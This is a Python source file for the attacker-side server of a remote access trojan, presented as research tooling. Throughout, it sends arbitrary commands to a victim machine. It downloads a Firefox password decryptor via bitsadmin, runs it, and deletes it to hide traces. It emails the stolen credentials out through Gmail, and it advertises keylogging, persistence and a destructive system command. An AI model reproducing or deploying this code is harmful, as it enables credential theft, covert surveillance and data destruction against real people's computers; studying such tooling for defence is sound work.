#!/usr/bin/env python3

# =============================================================================================
# Project: Python-based Command & Control (C2) Agent for Remote Administration (RAT) Research
# Developer: Randy Nin
# Role: Attacker-side Listener (C2 Server)
# Purpose: Cybersecurity research and authorized offensive security testing.
# =============================================================================================

import sys
import socket
import signal
import smtplib
from termcolor import colored
from email.mime.text import MIMEText

# Connection configuration
PORT=8888 # You can change the port as you wish

# Exfiltration settings (Must match Backdoor credentials)
EMAILADDR='<EMAILADDR>'
PASSKEY="<GMAIL APP PASSWORD>"


listener = None

def handler(sig, frame):
    """Gracefully handles SIGINT (Ctrl+C) to close the server"""

    print(colored(f"\n\n[!] Stopping C2 Server...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

class Listener:
    """Server class that listens for incoming backdoor connections and dispatches commands"""
    
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.options = {
            '!get-users': 'List system valid users (Exfiltrate via Gmail)', 
            '!get-firefox': 'Extract Firefox stored passwords using external tool',
            '!keylogg-start': 'Start Keylogger and exfiltrate data every 30 seconds',
            '!keylogg-stop': 'Stop Keylogger service',
            '!msg': 'Display a pop-up message (Format: !msg-YourMessage)',
            '!reboot':'Reboot the system',
            '!persistence': 'Establish persistence in the victim machine',
            '!kill-system': 'DANGER: Destructive system command (Requires Admin)',
            '!exit': 'Terminate backdoor execution',
            '!help': 'Display this help panel'
        }

        # Initialize TCP Server Socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.ip, self.port))
        self.server_socket.listen()
        
        print(colored(f"\n[*] Waiting for incoming connections on {self.ip}:{self.port}...", 'yellow'))
        self.c_sock, self.c_addr = self.server_socket.accept()

        # Initial handshake
        connection = self.c_sock.recv(5120).decode().strip()
        print(f"\n{connection} from [{self.c_addr}]\n")

    def execute_remotely(self, command):
        """Sends a command string to the victim and returns the decoded output"""

        self.c_sock.sendall(command.encode())
        command_output = self.c_sock.recv(5120).decode()
        return command_output

    def send_email(self, subject, body, sender, recipients, password):
        """Sends exfiltrated data to the attacker's email"""

        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(colored("\n[+] Exfiltrated data sent via Email!\n", 'green'))

    def get_users(self):
        """Retrieves Windows user accounts using 'net user'"""

        command_output = self.execute_remotely('net user')
        print(colored(f"{command_output}", 'blue'))

    def help_panel(self):
        """Displays available C2 commands"""

        print(colored(f"\n[i] Available Commands:", 'yellow'))
        for key, value in self.options.items():
            print(colored(f"\t{key} -- {value}", 'light_magenta'))
        print("\n")

    def get_firefox_profile(self, username):
        """Identifies the Firefox profile folder containing the credential database"""

        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        command = f"dir {path}"
        try:
            dir_command_output = self.execute_remotely(command)
            profile_line = next(line for line in dir_command_output.split('\n') if "release" in line)
            profile_name = profile_line.split()[-1]
            return profile_name
        except Exception:
            return None

    def get_firefox_passwords(self, username, profile):
        """Downloads a decryption tool, extracts passwords, and cleans up trace"""

        download_url = "https://github.com/RandyNin/c2-backdoor/raw/refs/heads/main/FirefoxDecrypt.exe"
        path_download = "%TEMP%\\FirefoxDecrypt.exe"
        options_download = "/transfer mydownload /download /priority normal"
        
        # Using BITSAdmin for 'stealthy' file transfer
        command_download = f"bitsadmin {options_download} {download_url} {path_download}"
        delete_command = f"del {path_download}"

        profile_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
        try:
            self.execute_remotely(command_download)
            command = f"{path_download} {profile_path}"
            passwords = self.execute_remotely(command)
            self.execute_remotely(delete_command)
            return passwords
        except Exception:
            return None

    def run(self):
        """Main C2 Interactive Shell loop"""

        self.help_panel()
        while True:
            command = input(colored("C2_Shell >> ", 'green'))
            
            # Special command handling
            match command:
                case '!get-users':
                    self.get_users()

                case '!get-firefox':
                    # Identifying victim user to build paths
                    username = self.execute_remotely("whoami").split('\\')[-1].strip()
                    profile = self.get_firefox_profile(username)

                    if not username or not profile:
                        print(colored(f"\n[!] Error: Unable to locate Firefox profiles\n", 'red'))
                    else:
                        print(colored("[*] Extracting credentials, please wait...", 'yellow'))
                        passwords = self.get_firefox_passwords(username, profile)

                        if passwords:
                            self.send_email("Decrypted Firefox Passwords", passwords, EMAILADDR, [EMAILADDR], PASSKEY)
                        else:
                            print(colored(f"\n[!] No passwords found or extraction failed", 'red'))

                case '!help':
                    self.help_panel()
                
                case _:
                    # General command execution
                    match command:
                        case '!keylogg-start':
                            print(colored(f"\n[!] Note: Keylogger active. Exfiltration every 30s. (Press Ctrl+C and run again to unlock)\n", 'yellow'))
                        case '!keylogg-stop':
                            print(colored(f"\n[!] Stopping keylogger service... (Press Ctrl+C and run again to unlock)\n", 'yellow'))
                        case '!msg':
                            print(colored(f"\n[!] Command format: !msg-YourMessage\n", 'yellow'))

                    command_output = self.execute_remotely(command)
                    
                    if command_output == f'[!] Disconnecting...\n':
                        print(colored(f"\n{command_output}", 'red'))
                        break
                    
                    print(colored(f"{command_output}", 'blue'))

if __name__ == '__main__':
    try:
        # Listening on all interfaces (0.0.0.0)
        listener = Listener('0.0.0.0', PORT)
        listener.run()
    except Exception as e:
        print(colored(f"\n[!] Server Error: {e}", 'red'))
    finally:
        if listener:
            listener.server_socket.close()
